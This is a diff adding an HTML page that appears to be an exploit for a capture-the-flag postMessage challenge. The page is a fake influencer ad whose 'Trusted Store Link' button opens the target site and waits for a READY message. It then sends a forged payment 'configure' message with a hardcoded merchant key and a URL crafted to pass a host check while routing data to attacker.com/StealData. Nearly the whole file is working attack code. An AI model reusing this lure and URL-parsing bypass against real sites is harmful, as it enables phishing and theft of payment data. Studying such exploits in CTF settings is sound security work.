@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Influencer</title>
+    <style>
+      div.holder {
+        margin: 100px auto;
+        width: 300px;
+        border: 2px solid #ababab;
+        text-align: center;
+        padding: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="holder">
+      <p>
+        Hey I've just heard about this new amazing gadget, get it at the
+        official store by clicking the button below!
+      </p>
+      <button onclick="startAttack()">Trusted Store Link</button>
+    </div>
+
+    <script>
+      let mypopup;
+      function startAttack() {
+        mypopup = window.open("http://trusted.pmsg.ctfio.com/");
+        window.addEventListener("message", (e) => {
+          if (e.data.length >= 45) {
+            if (e.data.substring(10, 15) === "READY") {
+              id = e.data.substring(34, 45);
+              let data = {
+                event: "configure",
+                id: id,
+                process: {
+                  url: "http://attacker.com%5cStealData%23@process.payment.pmsg.ctfio.com/%2f",
+                },
+                merchant_key: "348pk9cgf3bgyw2b",
+              };
+              mypopup.frames[0].postMessage(JSON.stringify(data), "*");
+            }
+          }
+        });
+      }
+    </script>
+  </body>
+</html>
